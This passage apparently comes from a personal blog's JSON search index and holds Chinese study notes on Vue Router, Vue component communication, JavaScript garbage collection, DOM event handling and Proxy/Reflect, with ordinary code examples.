    "snippet": "官方文档–Vue.Router实现组件之间的跳转：通过路由模块，将指定的组件显示在路由视图中，实现一个VUE组件中其他组件相互切换安装路由模块  已有项目添加npm  新建项目添加npm install vue-router -s  安装依赖route，routes，router在使用了vue-router的应用中，路由对象会被注入每个组件中，赋值为this.route对象获取的. 并且当路...",
    "content": "官方文档–Vue.Router实现组件之间的跳转：通过路由模块，将指定的组件显示在路由视图中，实现一个VUE组件中其他组件相互切换安装路由模块  已有项目添加npm  新建项目添加npm install vue-router -s  安装依赖route，routes，router在使用了vue-router的应用中，路由对象会被注入每个组件中，赋值为this.route对象获取的. 并且当路由切换时，路由对象会被更新。  route：首先它是个单数，译为路由，即我们可以理解为单个路由或者某一个路由；  routes：多个路由的集合，是一个数组  router：译为路由器，为VueRouter实例，容器包含上述两个或者说它是一个管理者，负责管理上述两个          router.push实现导航到不同URL      $router 为当前router跳转对象里面, 可获取name、path、query、params等      当用户在页面上点击按钮的时候，这个时候router就会去routes中去查找route，就是说路由器会去路由集合中找对应的路由静态路由表在src下创建routes.js// routers.jsimport Home from '@/components/Home. vueimport User from '@/components/user/user. vueexport const routes= [\t//暴露一个静态的路由    { path: '/', component: Home}.    { path:'/user', component: User}]引入并使用在main.js中引入路由模块// main.jsimport Vue from 'vue'import App from './App.vue'import router from './router' // 引入模块传递参数的方式传递参数主要有两种类型: params和query  this.$router.push()路由传值和获取的两种常见方法params的类型:  配置路由格式: /router/:idconst routes = [{\t\tpath: '/profile/:id',\t\tcomponent: profile\t}]  传递的方式: 在path后面跟上对应的值&lt;router-link :to=\"{      path:'/profile/'+123,      query:{name:'why',age:18}    }\"&gt;\t档案 &lt;/router-link&gt;  传递后形成的路径: /router/123, /router/abcquery的类型:  配置路由格式: /router, 也就是普通配置  传递的方式: 对象中使用query的key作为传递方式&lt;button @click=\"toProfile\"&gt;档案&lt;/button&gt;\t&lt;!-- 结合JavaScript--&gt;export default {  methods: {    toProfile(){      this.$router.push({        \"path\":'/profile/'+456,        \"query\":{\"name\":'why', \"age\":'19'}      })    }  }  传递后形成的路径: /router?id=123, /router?id=abc路由使用参数路由使用参数有两种方式:&lt;router-link&gt;和JavaScript&lt;router-link&gt;方式&lt;template&gt;\t//在profile组件中  &lt;div&gt;    &lt;h2&gt;我是文档文件&lt;/h2&gt;    &lt;p&gt;params: { { $ route.params }}'&lt;/p&gt;    &lt;p&gt;query:  { { $ route.query }}&lt;/p&gt;  &lt;/div&gt;&lt;/template&gt;JavaScript代码方式export default {  name: 'Home',  mounted() {    // 获取路径参数 params方式    const id = this.$route.params.id;    console.log('路径参数 id:', id);          // 获取查询参数 query 方式    const query = this.$route.query.example;    console.log('查询参数 example:', query)          // params方式 跳转页面    this.$router.push({ name: 'home', params: { id: 123 } });    // query方式 跳转页面    this.$router.push({ name: 'about', query: { example: 1 } });  },};路由的两种模式单页面模式的重点：改变前端页面而不会向后端发送请求源码解析：vue-router实现原理及两种模式分析 - 知乎 (zhihu.com)hash (默认)window.addEventListener('hashchange', function(){    // 监听hash变化，点击浏览器的前进后退会触发})​\t标志符号 # + hash值  不包含在HTTP请求中，对服务器无影响  用以指导浏览器动作  每次改变hash值都会在浏览器留下记录history​\t从HTML5开始，History interface提供了两个新的方法：pushState(), replaceState()使得我们可以对浏览器历史记录栈进行修改window.history.pushState(stateObject, title, URL)window.history.replaceState(stateObject, title, URL)      stateObject: 当浏览器跳转到新的状态时，将触发popState事件，该事件将携带这个stateObject参数的副本    title: 所添加记录的标题  URL: 所添加记录的URL​\t当调用他们修改浏览器历史记录栈后，虽然当前URL改变了，但浏览器不会刷新页面，这就为单页应用前端路由“更新视图但不重新请求页面”提供了基础。​\t浏览器历史记录可以看作一个「栈」。      用户每点开一个新网页，都会在上面加一个新盘子，叫「入栈」。        用户每次点击「后退」按钮都会取走最上面的那个盘子，叫做「出栈」。    而每次浏览器显示的自然是最顶端的盘子的内容。  58道Vue常见面试题集锦，涵盖入门到精通，自测 Vue 掌握程度动态路由  某种匹配模式下的路由，映射到同一个组件中  本质 — 使用 url 传值，决定页面数据路由守卫  路由拦截，需要结合meta来实现  异步解析执行，所有守卫resolve完之前一直处于等待状态全局路由守卫​\t定义在main.js的路由实例化对象      全局 - 前置守卫router.beforeEach((to,from,next)=&gt;{})，          访问路由前调用      允许放行 next();，不允许放行next('/login');指定去哪            全局 - 后置钩子router.afterEach((to,from)=&gt;{}) ，          每次切换路由时调用，不接受next()也不改变导航本身      修改每个页面的title，通过读取meta中的信息来修改页面title      页面切换的时候让页面滚动到最顶部      router.afterEach((to, from)=&gt;{    document. title = to. title;     window. scrollTo(0,0);})router独享守卫​\t定义在路由配置上的守卫const router = new VueRouter({routes: [{        path: '/foo',        component: Foo,        beforeEnter: (to, from, next) =&gt;{        // ..        }\t}]})组件内路由守卫  beforeRouteEnter(第一次创建组件实例前)  beforeRouteUpdate（在组件被复用的时候调用）  beforeRouteLeave（离开组件）权限控制路由元信息（meta）  to.meta.roles.includes(role) 目的路由的元路由信息，是否包括了用户的角色routes: [    {        path: '/login',        name: 'login',        meta: {            roles: ['admin', 'user']        },        component: () =&gt; import('../components/Login.vue')    },    {        path: 'home',        name: 'home',        meta: {            roles: ['admin']        },        component: () =&gt; import('../views/Home.vue')    },]//假设有两种角色：admin 和 user  //从后台获取的用户角色const role = 'user'//当进入一个页面是会触发导航守卫 router.beforeEach 事件router.beforeEach((to,from,next)=&gt;{\tif(to.meta.roles.includes(role)){\t\tnext()\t//放行\t}esle{\t\tnext({path:\"/404\"})\t//跳到404页面\t}})动态加载菜单和路由（addRoutes）  addRoutes() 动态添加在路由表中push路由  按顺序匹配，404等页面动态添加在后面根据用户登录的权限信息，获取权限菜单，保存在store中"
  },
  
  {
    "title": "组件交互",
    "url": "/posts/%E7%BB%84%E4%BB%B6%E4%BA%A4%E4%BA%92/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-04 00:00:00 +0800",
    





    
    "snippet": "父传子 props​\t父组件传递给子组件的数据，子组件通过props接受后，不能直接更改该值。这是因为：  所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中  但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解Step 1 — 父亲建立关系import Child from './ch...",
    "content": "父传子 props​\t父组件传递给子组件的数据，子组件通过props接受后，不能直接更改该值。这是因为：  所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中  但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解Step 1 — 父亲建立关系import Child from './child';componensts: { Child } // 引入组件Step 2 — 父亲引用子组件&lt;Child :bothSameName=\"inFatherDataVuale\"&gt;&lt;Child&gt;Step 3 — 孩子接受父消息props:{\tbothSameName:{      type: String,      default: undefined    }}Step 4 — 孩子使用消息&lt;p&gt;&lt;/p&gt;// 父组件&lt;body&gt;    &lt;div&gt;        &lt;son :bothSameValueName=\"inFatherDataVuale\" /&gt;    &lt;/div&gt;&lt;/body&gt;&lt;script&gt;    import son from './son' //引入子组件    export default {        name: 'Parent',        components: { son },        data() {            return {                inFatherDataVuale: 'Hi,my son！',            }        }    }&lt;/script&gt;// 子组件&lt;body&gt;    &lt;div&gt;        &lt;p&gt;父亲说： &lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;&lt;script&gt;    export default {        name: 'son',        props: {            bothSameValueName: {                type: String,                default: undefined                //required:ture/false  是否是必须的            }        },        data() {            return {                inSonDataVuale: this.bothSameValueName            }        }    }&lt;/script&gt;子传父 $emitStep 1 — 孩子自定义事件this.$emit('SonSentToFather',this.number);Step 2 — 父亲建立联系import Child from './child';componensts: { Child } // 引入组件Step 3 — 父亲使用子组件&lt;Child @SonSentToFather='getNum'&gt;&lt;/Child&gt; // 绑定的事件名：事件回调函数Step 4 — 父亲定义函数接受参数methods:{    getNum(val){ this.SonNum = val;}}// 父组件&lt;template&gt;\t&lt;son @SonSentToFather=\"getSonNum()\" /&gt;&lt;/template&gt;&lt;script&gt;    import son from './son'    export default {        name: 'first_father',        components: { son },        data() {            return {                SonNum: ''            }        },        methods: {            getSonNum: function (val) {                this.SonNum = val            }        }    }&lt;/script&gt;// 子组件&lt;template&gt;\t&lt;input type=\"text\" v-model=\"a\" @click=\"setLink\" placeholder=\"传递给第一个父亲\"&gt;&lt;/template&gt;&lt;script&gt;    export default {        name: 'son',        data () {            return {                number: 2992            }        },        methods: {            setLink: function () {                this.$emit('SonSentToFather', this.number)            }        }&lt;/script&gt;子传父 自定义事件使用场景：子组件给父组件传值 — 父组件给子组件绑定自定义事件，子组件触发事件，回调函数在父组件中      绑定事件 $emit(\"eventName\",parmas)        解绑事件 $off(\"eventName\")        监听事件 $on(\"eventName\",parmas)  $emit给谁绑定事件，找谁触发事件，找谁解绑事件$on​\t只触发一次 $once 或者 eventName.once  自定义事件的回调函数，this指向被绑定、被触发的组件  在当前组件调用methods定义的函数时，已当前组件函数的this为主  生命周期钩子以普通函数方式定义，this一定取当前组件mounted(){    this.$refs.children // 这里的this指向children组件    .$on(\"eventName\",this.getChildrenName) // 在当前组件调用methods定义的函数，以当前组件this为主        this.$refs.children // 这里的this指向children组件    .$on(\"eventName\",function(name, ...params){ // 新定义的函数，指在children只能定义一个函数，参数取值都在children中\t\tconsole.log(this);    })        this.$refs.children // 这里的this指向children组件, 外层的this指向father    .$on(\"eventName\",(name,...params)=&gt;{ // 箭头函数往外层找this        this.sonValueName = name;    })}【总结】使用$ref为组件绑定自定义事件时，必须关注this的指向 — 回调要么配置在methods中，要么使用箭头函数$off  解绑一个this.$off('eventName');  解绑多个 — 必须写在数组中this.$off(['eventName1','eventName2']);  解绑全部this.$off();兄弟间传值 EventBus:warning: 兄弟彼此之间没有联系，使用Vue实例作为Bus数据传递Step １ — 建立Busimport Vue from 'vueexport default new Vue()Step ２ — 兄弟上车import eventBus from './EventBus\"Step ３ — 接收方配置created() { // 创建时就打开通道，或 mounted时刻监控    eventBus.$on('pushMsg', (sendMsg) =&gt; {        this.getMsg = sendMsg;    })}Step ４— 发送方配置methods: {    pushMsg(){        eventBus.$emit('pushMsgTage',this.sendMsg);    }}// 发送方&lt;script&gt;    import eventBus from './EventBus';    export default {        name: 'SendSide',        components: {},        data() {            return {                sendMsg: ''            }        },        methods: {            pushMsg() {                eventBus.$emit('pushMsgTage', this.sendMsg);            }        }    }&lt;/script&gt;// 接收方&lt;body&gt;    发送方 传过来的消息： &lt;/body&gt;&lt;script&gt;    import eventBus from './EventBus';    export default {        name: 'getSide',        components: {},        data() {            return {                getMsg: ''            }        },        created() {            eventBus.$on('pushMsgTage', (sendMsg) =&gt; {                this.getMsg = sendMsg;            })        }    }&lt;/script&gt;兄弟间传值 全局事件总线（GlobalEventBus）​\t适用于任意组件间的通信①所有组件都能看到它  的有三种：  window — 不应该修改  VueComponent — 仅一个构造函数，需要调用Vue.extend生成  vc — 每次生成都是一个新的实例，互不关联  Vue  — 将x放在 Vue的原型对象上 Vue.prototypeVueComponent.prototype._proto_ === Vue.prototype 组件实例对象Vc可以访问到Vue原型上的属性、方法②它可以调用所有组件的事件：      基础数据类型，不含括$on $off $emit        VueComponent — vue实例vm无法调用          const Demo = Vue.extend({config})  — Demo 是Vue.extend生成一个VueComponent 构造函数      const demo = new Demo — demo 是通过new 创建的vc实例对象      相当于在页面中引入一个组件&lt;vm /&gt;      Vue.prototype.x = demo — Vue的原型对象上配置一个vc对象，拥有调用组件事件的函数            vue实例                  Vue 创建前绑定，没有vue实例对象可以赋值；Vue 创建完成后绑定，页面已经完成挂载，子组件调用不到                    Vue beforeCreate()时绑定，且指向自身（无需新增变量）        初始化时，Vue数据检查、数据代理未开始，页面未挂载            ❗ 定义new Vue({    el:\"#app\",    render: h=&gt;h(App),    beforeCreate(){        Vue.prototype.$bus = this // 安装全局事件总线    }})export default{    name:\"\",    methods:{\t\tsendMsg(){            this.$bus.$emit('hello', name) // 在全局事件总线上绑定事件，sendMsg触发        }    }}❗ 使用mounted(){    this.$bus.$on('hello',(data) =&gt;{ // 监听事件，事件调用放在调用者身上        console.log('接受到数据',data)    })    beforeDestroy(){        this.$bus.$off('hello'); // 当前组件销毁前，解绑事件（下车，把位置让给别人坐）        this.$bus.$off(); // 清空全局事件总线 （整个车子都没有座位了）    }}路由传值"
  },
  
  {
    "title": "11. 垃圾回收机制",
    "url": "/posts/11.%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-09-05 00:00:00 +0800",
    





    
    "snippet": "  回收对象 —— 当一个变量没有被其他变量或属性引用的时候          全局变量 ：持续到浏览器页面关闭      局部变量 ：函数执行结束后      数据存储      基本数据类型 —— 栈        引用数据类型 —— 堆，在栈中存储实际对象引用    当引用数据类型引用目标改变时，旧的栈实际对象失去引用，这变成需要回收的垃圾        两种常用方法    ​\t垃圾回...",
    "content": "  回收对象 —— 当一个变量没有被其他变量或属性引用的时候          全局变量 ：持续到浏览器页面关闭      局部变量 ：函数执行结束后      数据存储      基本数据类型 —— 栈        引用数据类型 —— 堆，在栈中存储实际对象引用    当引用数据类型引用目标改变时，旧的栈实际对象失去引用，这变成需要回收的垃圾        两种常用方法    ​\t垃圾回收并不是实时的，因为开销比较大，所以垃圾回收器会周期性的释放程序中已经不在被引用的垃圾对象。浏览器常使用到两种标准策略：标记清理、引用计数    1. 标记清除法（大部分浏览器） Mark-Sweep    两个阶段：                  标记：从根节点遍历，给每个可访问的对象打上标记，表示对象可达        （标记打法可以是维护俩个“在不在上下文”的堆栈；也可以是活跃时反转某一位，不活跃时恢复）                    清除：在没有可用分块空间时（或某个固定频率），对堆内存遍历，回收没有标记的对象（清除无引用对象）              优点：实现简单    缺点：内存过于碎片化（标记-整理法）；分配速度慢（遍历）    优化方案：**标记-整理法  Mark-Compact **    ​\t清除时对堆内存遍历时，先将被引用的对象移动到一起，然后再清理    2. 引用计数法 Reference counting    ​\t追踪每个变量被引用的次数，当引用为0时回收；（回收效率高）：          赋值给引用值时，引用数 +1；      保存引用的变量被覆盖了，引用数 -1        缺点：a 计数器的增减处理频繁，会导致空间的使用效率降低。       b 循环引用无法收回，导致内存泄漏。    3. 循环引用    在IE9之前，涉及到COM对象（组件对象模型，Component Object Model），就无法避免 循环引用 的问题：          BOM 和 DOM 中对象是C++实现的COM对象，使用 引用计数 实现垃圾回收。即使引擎使用 标志清理，设计到COM对象依然可能形成循环引用，即使在页面中删除DOM元素内存也一样。        let element = document.getElementById('one'); // com对象let obj = new Object() // 原生obj对象obj.element = element;element.obj = obj;   // 避免：确保两者没有联系obj.element = null;element.obj = null;        在IE9之后，BOM 和 DOM 对象都变成了JavaScript对象，避免了循环引用问题，及常见的内存泄露问题。    分代式垃圾回收机制          新生代：对象存活时间短，通常支持 1~8M      老生代：对象存储 存活时间长、常驻内存的对象        两个内存区域回收频率不同，V8才有两个垃圾回收器管控：        新生代垃圾回收    ​\tCheney算法，将堆内存分为两个区（semispace 半空间）：一个使用状态的空间我们称为使用区（From 空间）。一个处于闲置状态的空间称为空闲区（To 空间）    垃圾回收机制——翻转 （Scavenge）          先对使用区中的活动做标记      标记完成后，将使用区的活动对象复制进空闲区并进行排序      将原先使用区对象占用的空间释放      最后进行角色互换，把空闲区变为使用区，使用区变为空闲区        缺点：由于只能使用堆内存的一半，所以不适用大规模的垃圾回收机制中，是典型的牺牲空间换时间的算法。 —— 新生代内存空间较小、生命周期短（活对象少）    并行回收    Javascript是一门单线程语言，它是运行在主线程上的，而在进行垃圾回收的时候就会阻塞Javascript脚本的执行，需等待垃圾回收完毕后再恢复脚本执行，这种行为叫全停顿。    那当GC时间过长就会造成页面卡顿问题。    那一个人干活慢，n个人一起速度便会是一个人的n倍。程序也一样，我们可以通过    并行回收机制：引入多个辅助线程来同时处理新生代对象空间就采用并行策略。在垃圾回收过程中，    启动多个线程来负责新生代中的垃圾清理，这些线程同时将对象空间中的数据移到空22    由于这个过程中数据地址会发生改变，所以还需要同步更新引用这些对象的指针。    新生代何时会到老生代          多次复制后依然存活的对象，可以认为是生命周期教强的对象，移到老生代管理      复制一个对象在空闲区时，占用空闲区空间的25%，则移到老生代管理 —— 当完成Scavenge回收，空间区变为使用区，会继续参与内存分配，比重过大影响后续内存分配        老生代垃圾回收    ​\t老生代数据大多是存活的对象，不需要时常更新，可以使用 标记清收法 回收。在V8中使用 标记整理法 解决标记清除后产生的大量内存碎片。    增量标记 （incremental marking）    ​\t代替 并行策略的全停顿式 的垃圾回收，节省清除较大对象的老生代的时间问题          一次GC分成多步小GC标记，让JS和小GC标记交替执行，直到标记完成。      应用逻辑执行一会，垃圾回收与应用逻辑交替执行直到标记阶段完成              存在问题：      ​\t小GC标记执行完后是如何暂停执行JS任务？—— 三色标记法      ​\t如何进行下一次小GC 标记？—— 惰性清理      ​\t如果执行JS任务时刚被标记好的对象引用又被修改了该当如何？ —— 写屏障        三色标记法          黑色表示对象自身及对象的引用都被标记（已检查状态）      白色表示未被标记的对象（初始状态）      灰色表示自身被标记，自身的引用未被标记（待检查状态）        执行流程：          初始所有对象都是白色      从root对象开始、标记为灰色，并推入标记工作表中；      当收集器从标记工作表中弹出对象，并访问它所有引用对象时，自身灰色就会变换成黑色      将自身的下一个引用对象标志为灰色        一直执行，直到没有可以被标记为灰色的对象，剩下的白色对象都是不可达的，进入清除阶段；    恢复时，从灰色标记对象开始执行    写屏障    目的：          解决黑色对象在程序执行中被新添加引用      已经标记黑色的被引用对象不再被引用了        写屏障就有了以下两个变化：    ​\t1. 不对已标记的黑色对象做处理，因为在之后的GC中也会被清理。          Write-barrier 机制强制不变黑的对象指向白色对象。                  这个也被称作强三色不变性。所以          一旦有黑色对象引用白色对象，该机制会强制将引用的白色对象改为灰色          从而保证下一次增量 GC 标记阶段可以正确标记                      惰性清理 （lazy sweeping）    ​\t增量标记完后，如果当前内存足以支持代码的快速运行，也没必要立即清理，可让程序先运行，也无需一次性清理完所有垃圾对象，可以按需清理直到所有垃圾对象清理完后再继续增量标记。    V8 script 隐藏类    JS 性能优化 —– V8 隐藏类    ​\t“一次性声明”：避免生成不同的隐藏类，“先创建再补充”式动态属性赋值，并在构造函数中一次性声明所有属性    ​\t“置空不删除”：动态删除属性和新增属性一样，使得同一个构造函数出来的实例不再共享隐藏类。最佳方案是 = null    优化程序回收，提高性能          手动回收（不建议）：window.ColloectGarbage()（IE）、window.opera.collect()（opera7以上）立即启动垃圾回收；      解除引用：将不需要的数据设置为null，释放其引用，在下次回收时释放内存。      1. 使用 块级作用域 ，尽早让垃圾回收程序介入。      "
  },
  
  {
    "title": "10. 事件",
    "url": "/posts/10.%E4%BA%8B%E4%BB%B6/",
    "categories": "JavaScript, Event",
    "tags": "javascriptBase",
    "date": "2022-09-02 00:00:00 +0800",
    





    
    "snippet": "  JavaScript 与 HTML 交互通过 事件 实现；代表文档document 或 浏览器窗口中某个意义的时刻  监听器 ，订阅事件（处理程序） 监听事件发生时执行  触发事件以测试：dispatchEvent()事件流​\t事件流描述了页面接受事件的顺序  IE 支持事件冒泡流          IE事件流被称为事件冒泡      事件从最具体的元素（文档树中最深的节点）开始出发，然...",
    "content": "  JavaScript 与 HTML 交互通过 事件 实现；代表文档document 或 浏览器窗口中某个意义的时刻  监听器 ，订阅事件（处理程序） 监听事件发生时执行  触发事件以测试：dispatchEvent()事件流​\t事件流描述了页面接受事件的顺序  IE 支持事件冒泡流          IE事件流被称为事件冒泡      事件从最具体的元素（文档树中最深的节点）开始出发，然后向上传播到没有那么具体的元素（Document）      IE5.5及早期版本跳过&lt;html&gt; (&lt;body&gt; -&gt; &lt;document&gt;)        Netscape Comuunicator 支持事件捕获流          事件捕获：为在事件达到最终目标前拦截事件（新版本浏览器都支持事件捕获，但旧版本不支持）      最不具体的节点最先收到事件，而具体的节点最后收到事件；      从window对象开始捕获对象，DOM2 Events从document开始        DOM 事件流          DOM2 Events 规定事件分为三个阶段；事件捕获、到达目标、事件冒泡      IE9 之后的浏览器都支持DOM事件流，但会在捕获阶段在事件目标上触发事件 —— 事件目标有两个时机处理事件。      事件处理程序​\t为响应事件而调用的函数被称为 事件处理程序（事件监听器），名字常以on开头，集合多个处理程序名称以handle结尾HTML​\t属性值是JavaScript代码，需要经过转义的情况下使用HTML语法字符&lt;input type=\"button\" value=\"点击按钮触发事件\" onclick=\"console.log('Clicked!')\"/&gt;&lt;!-- 转义 添加空格 --&gt;&lt;input type=\"button\" value=\"点击按钮触发事件\" onclick=\"console.log('&amp;quote;Clicked!&amp;quote;')\"/&gt;&lt;!-- 调用其他地方脚本 --&gt;&lt;input type=\"button\" value=\"点击按钮触发事件\" onclick=\"showMessage()\"/&gt;💬 调用外部脚本showMessage，存在以下特殊的局部变量：  特殊局部变量 event对象  this值相当于事件的目标元素  扩展作用域链：document 和 元素自身成员💬 在 HTML 中指定事件处理程序，存在以下问题：      作用域扩展在不同浏览器中可以导致不同结果，范围无限定的对象可能导致错误        调用时机：元素生成在前，监听器定义在后，用户已经交互过，不会触发监听器，会发生错误；    为此，HTML 事件处理程序会封装到try/catch块中，使这种情况静默失败 —— 捕获在先，元素响应在后  &lt;input type=\"button\" value=\"点击按钮触发事件\" onclick=\"try{                                                    showMessage();                                                   } catch(ex){}                                                                                             \"/&gt;DOM0​\t将一个函数赋值给（DOM元素的）一个事件处理程序的属性 —— JavaScript指定之前必须先取得操作对象的引用​\t在运行之后才会给事件处理程序赋值，注册在事件流的冒泡阶段let btn = document.getElementById('myBtn'); btn.onclick = function(){ \t// 函数被视为元素的方法，在元素作用域中运行；this = 元素    console.log('Clicked!')}// 将属性值设置为null，移除DOM0方式添加的事件处理程序btn.onclick = null;DOM2​\t提供两个方法处理程序：新增 addEventListener() 移除removeEventListener，暴露在所有DOM节点上。​\t接受三个参数：事件名（click）、事件处理函数、布尔值（false 默认值，冒泡阶段调用；true 捕获阶段调用）​\t使用addEventListener添加的监视器，必须使用removeEventListener并传入添加时相同参数来移除 —— 匿名函数无法移除。​\t主要优势：可以为同一个事件添加多个事件处理程序，顺序触发。​\t事件处理程序通常会被添加到事件流的冒泡阶段（主要原因是跨浏览器兼容性好），注册到捕获阶段参与于事件到达指定目标之前拦截。IE​\t提供两个方法处理程序：新增  attachEvent 移除 detachEvent，暴露在所有DOM节点上。​\t接受两个参数：事件名（on+ click）、事件处理函数 —— IE8及之前只支持事件冒泡，所有会添加到事件冒泡阶段。​\t使用 attachEvent添加的监视器，必须使用detachEvent并传入添加时相同参数来移除、或传入监视器引用—— 匿名函数无法移除。​\t与DOM0区别在于：this = window，程序在全局作用域中运行；​\t同DOM2同样可以为同一个事件添加多个事件处理程序，顺序方向触发跨浏览器事件处理程序var EventUtil = {    addHandler: function(element, type, handler){        if(element.addEventListener){ // DOM2            element.addEventListener(type, handler, false)        }else if(element.attachEvent){ // IE            element.attachEvent('on'+type, handler)       \t}else{ // DOM0            element['on'+type] = handler;        }    },    removeHandler: function(element, type, handler){        if(element.removeEventListener){ // DOM2            element.removeEventListener(type, handler, false)        }else if(element.delactEvent){ // IE            element.delactEvent('on'+type, handler)       \t}else{ // DOM0            element['on'+type] = null;        }    },}❗ 依然未解决以下问题：  IE的作用域问题  多个事件处理程序顺序问题  DOM0 只支持一次添加一个事件处理程序事件对象​\t事件发生时，所有相关信息会存储在event对象中。包含：事件元素、事件类型、可能与特点事件相关的任何其他数据。DOM 事件对象​\t在DOM中（无论是DOM0 或 DOM2），event对象是传递给事件处理程序的唯一参数。​\tevent对象只在事件处理程序执行期间存在，执行完毕就销毁。包含以下公有的属性和方法：  target 相关的属性​\t在事件处理程序内部，this = currentTarget，而target只包含事件实际目标。​\t如果处理程添加到了意图的目标，则this = currentTarget = target  阻止默认动作​\tpreventDefault() 用于阻止特定事件的默认动作，且不影响事件后续传播；前提是其对象的cancelable = true（允许取消）​\tstopPropagation() 用以立即阻止事件流在DOM结构的传播，取消后续事件的捕获和冒泡。  eventPhase 属性可以确定事件流当前所处的阶段：      1 —— 事件在捕获阶段被调用        2 —— 事件在目标上被调用        3 —— 事件在冒泡阶段被调用  IE 事件对象​\tIE中的事件对象event是基于事件处理程序被指定的方式以不同方式访问。// DOM0方式指定，event对象是window对象的一个属性。var btn = document.getElementById('myBtn');btn.onclick = function(){\tlet event = window.event; // event.type = 'click'    this === event.srcElement; // true 运行在函数内部}// IE 方式指定，event对象仍然是window对象的属性var btn = document.getElementById('myBtn');btn.attachEvent('onclick',function(event){    event.type; // 'click'    this === event.srcElement; // false 运行在全局作用域下})&lt;!-- HTML 方式指定，同样可以使用event对象访问 --&gt;&lt;input type=\"button\" value=\"点击触发事件\" onclick=\"console.log(event.type)\"/&gt;       this的指向问题    事件处理程序的作用域取决于指定的方式，所以this值并不总是等于事件目标。在IE事件对象中存在一个属性srcElement，只读，指向事件目标（同DOM中的target）可以代替this。        阻止默认动作  ​\treturnValue = false 等同于 DOM中的preventDefault()，取消事件默认行为。​\t`\tcancelButton = true` 属性阻止事件冒泡（IE 中只有冒泡）。​\tstopPropagation() 用以立即阻止事件流在DOM结构的传播，取消后续事件的捕获和冒泡。跨浏览器事件对象var EventUtil = {    // addHandler()     getEvent: function(event){        return event? event : window.event;    },    getTarget: function(event){        return event.target || event.srcElement;    },    preventDefault: function(event){        if(event.preventDefault) event.preventDefault();        else\tevent.returnValue = false;    },    // removeHandler()}内存和性能​\t在JavaScript中，页面的处理程序数量与页面整体性能相关。​\t:one: 每个处理程序都是一个对象，都占用内存空间；​\t:two: 处理程序需要访问DOM次数造成页面交互延长；​\t:three: 不正当清理处理程序，会导致DOM元素被引用次数过多而无法释放内存。事件委托​\t给所有元素的 共同父节点添加一个事件处理程序，利用冒泡向上传递的性质，根据传入的事件类型决定执行的处理程序。​\t👍随时可用。只有页面渲染出可以交互的元素，可以无延迟起作用（无需要等待DOMContentLoaded和load事件）​\t👍节省引用、代码数量。减少整个页面需要的内存，提供性能。删除事件处理程序​\t直接删除带有事件处理程序的元素，因为存在着元素的引用和程序的引用，所以不会被垃圾收集程序正常清理。// 正确处理：let btn = document.getElementById('myBtn');btn.onclick = funciton(){    //    btn.onclick = null; // 删除事件处理程序    document.getElementById('myDiv').innerHTML = '父节点替换掉按钮的内容'}​\t页面卸载后，事件处理程序没有被清理，则仍然会驻留在内存中；随着页面每次加载、卸载，越来越占用内存。应该在 onunload 之前，删除事件处理程序；在onload 事件处理程序中做了什么，就应该在 onunload事件处理程序中恢复。"
  },
  
  {
    "title": "9. Proxy & Reflect",
    "url": "/posts/9.Proxy&Reflect/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-09-01 00:00:00 +0800",
    





    
    "snippet": "Proxy &amp; Reflect  代理 — 改变某些操作的默认行为， — Reflect确保原有默认行为正常                              [实现元编程]([Reflect Metadata          深入理解 TypeScript (jkchao.github.io)](https://jkchao.github.io/typescript-bo...",
    "content": "Proxy &amp; Reflect  代理 — 改变某些操作的默认行为， — Reflect确保原有默认行为正常                              [实现元编程]([Reflect Metadata          深入理解 TypeScript (jkchao.github.io)](https://jkchao.github.io/typescript-book-chinese/tips/metadata.html#基础)) — 对编程语言进行编译（在语言层面编程）                      var proxy = new Proxy( target, handler )          target — 所要拦截的 目的对象      handle — 定制拦截对象        Proxy.prototype = undefined ，所以不能用instanceof操作符  不可配置、不可读写的属性不能代理var proxy = new Proxy({},{    get:function(target, key, receiver){ // obj.p时，触发p作为target        return Reflect.get(target, propKey, receiver);    },    set:function(target, key, value, receiver){        return Reflect.set(target, propKey, value, receiver);    }})let obj = Object.creat(proxy); // 将proxy添加到obj的原型上，实现Proxy的继承，读取【原型属性】会被拦截var object = {proxy: new Proxy(target, handler)}; // object 可以调用proxy要使Proxy起作用，必须针对Proxy实例proxy操作，而不是针对目标对象操作 —— 直接操作会绕过代理施予的行为const targetObj = {    where:function(){        console.log(\"I am in target\");    }};var proxy = new Proxy(targetObj,{    get:function(target, propKey){        if(propKey === \"where\"){ // targetObj 里面的属性名 === where进行拦截            console.log(\"I am in proxy\");        }        return target[propKey]; // 返回targetObj原有的属性    }});proxy.where();  //I am in proxy + I am in targettarget.where(); //I am in target若handler是一个空对象，则没有任何拦截效果，访问 Proxy = 访问 targetReflect​\tReflect一个全局内置对象，将默认操作从处理器转发到 target。处理器对象中所有可以捕获的方法都有对应的反射（Reflect）API方法。Reflect 与 targe 方法具有相同的名称和签名属性，且具有相同的方法行为。​\tReflect不是一个函数对象、构造函数，无法像对象一样调用和使用new创建实例；内部所有的属性和方法都是静态。// 1. 安全调用函数// 使用 apply 调用函数时，target 可能自定义了自己的 apply 属性，可以使用 Function.prototype 规避这个问题Function.prototype.apply.call(Math.floor, undefined, [1.75]); // 1Reflect.apply(Math.floor, undefined, [1.75]); // 1;​\t根据一些反射方法返回”状态标记”的布尔值，可以检查意图操作是否成功。但如果是语法出现问题，无法拦截错误。// 2. 使用“状态标志”替换属性定义异常捕获处理try{    Object.defineProperty(obj, prop, attr);}catch(e) {    // Fail}\t// // if (Reflect.defineProperty(obj, prop, attr)) if (Reflect.defineProperty(o,'foo',{value:'bar'})){    console.log(\"1\")}else{    console.log(\"2\")}            Reflect API      返回值      与操作符相比                  Reflect.defineProperty()      提供状态标志                     Reflect.deleteProperty()      提供状态标志      代替delete操作符              Reflect.setPrototyoeOf()      提供状态标志                     Reflect.has()             代替in、with操作符              Reflect.set()      提供状态标志      代替=操作符              Reflect.get()             代替对象属性访问操作符              Reflect.preventExtensions()      提供状态标志      类似Objext.preventExtensions（可强转为对象），但操作对象只能是对象              Reflect.construct()             代替new操作符      // 3.Reflect API 与 一等函数 